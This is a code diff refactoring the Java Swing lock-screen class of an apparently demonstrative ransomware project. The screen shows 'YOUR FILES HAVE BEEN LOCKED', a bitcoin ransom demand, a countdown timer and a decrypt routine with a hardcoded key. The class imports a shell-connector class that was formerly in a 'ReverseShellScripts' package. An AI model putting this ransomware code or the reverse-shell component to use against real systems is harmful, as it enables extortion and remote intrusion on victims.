@@ -1,6 +1,6 @@
 import Decryptor.Decrypt;
 import Decryptor.PaymentCode;
-import ReverseShellScripts.ShellConnector;
+import NetworkShell.ShellConnector;
 
 import javax.swing.*;
 import java.awt.*;
@@ -14,16 +14,12 @@ public class GUI {
 
     public JTextField DecryptConfirmation;
     private JLabel BitcoinDemand;
-    private JLabel BitcoinInfo;
-    private JFrame frame;
+    private final JFrame frame;
     private JLabel label;
-    private JLabel timerLabel;
-    private JButton Exit;
-    private JButton decryptSafe;
-    private int width;
-    private int height;
+    private final JLabel timerLabel;
+    private final JButton Exit;
+    private final JButton decryptSafe;
     private Timer countdownTimer;
-    private ImageIcon image;
     private long remainingMillis = 86400000;
     private int wrongAttempts = 0;
     int BitcoinAddress = (int)(Math.random() * 1000000);
@@ -36,8 +32,6 @@ public class GUI {
         Exit = new JButton("Exit");
         decryptSafe = new JButton("Safe Decrypt");
         timerLabel = new JLabel();
-        width = w;
-        height = h;
     }
 
     public void setUpGUI() {
@@ -49,8 +43,9 @@ public class GUI {
         frame.setResizable(false);
         cp.setBackground(Color.decode("#0068FF"));//original blue background
 
+        ImageIcon image;
         try {
-            ImageIcon originalIcon = new ImageIcon("JavaSwing/src/main/resources/Alien.png");
+            ImageIcon originalIcon = new ImageIcon("CobaltLock/src/main/resources/Alien.png");
             Image originalImage = originalIcon.getImage();
             Image scaledImage = originalImage.getScaledInstance(300, 300, Image.SCALE_SMOOTH);
             image = new ImageIcon(scaledImage);
@@ -63,10 +58,10 @@ public class GUI {
         BitcoinDemand.setFont(new Font("Arial", Font.BOLD, 24));
         BitcoinDemand.setHorizontalAlignment(SwingConstants.CENTER);
 
-        BitcoinInfo = new JLabel("Bitcoin address: " + BitcoinAddress);
-        BitcoinInfo.setBounds(50, 175, 500, 200);
-        BitcoinInfo.setFont(new Font("Arial", Font.BOLD, 24));
-        BitcoinInfo.setHorizontalAlignment(SwingConstants.CENTER);
+        JLabel bitcoinInfo = new JLabel("Bitcoin address: " + BitcoinAddress);
+        bitcoinInfo.setBounds(50, 175, 500, 200);
+        bitcoinInfo.setFont(new Font("Arial", Font.BOLD, 24));
+        bitcoinInfo.setHorizontalAlignment(SwingConstants.CENTER);
 
         label = new JLabel("YOUR FILES HAVE BEEN LOCKED", SwingConstants.CENTER);
         label.setBounds(50, 10, 500, 200);
@@ -90,7 +85,7 @@ public class GUI {
 
         cp.add(DecryptConfirmation);
         cp.add(BitcoinDemand);
-        cp.add(BitcoinInfo);
+        cp.add(bitcoinInfo);
         cp.add(label);
         cp.add(timerLabel);
         cp.add(alienLabel);
@@ -134,13 +129,13 @@ public class GUI {
             try {
                 Decrypt.decryptAllFilesInDirectory(
                         "1234567812345678",
-                        "JavaSwing/src/main/ExampleFiles",
-                        "src/main/DecryptedFiles"
+                        "CobaltLock/src/main/ExampleFiles",
+                        "CobaltLock/src/main/DecryptedFiles"
                 );
                 JOptionPane.showMessageDialog(frame, "Decryption complete!");
                 System.exit(0);
             } catch (Exception ex) {
-                ex.printStackTrace();
+                System.err.println("Exception occurred: " + ex.getMessage());
                 JOptionPane.showMessageDialog(frame, "Decryption failed: " + ex.getMessage());
             }
         });
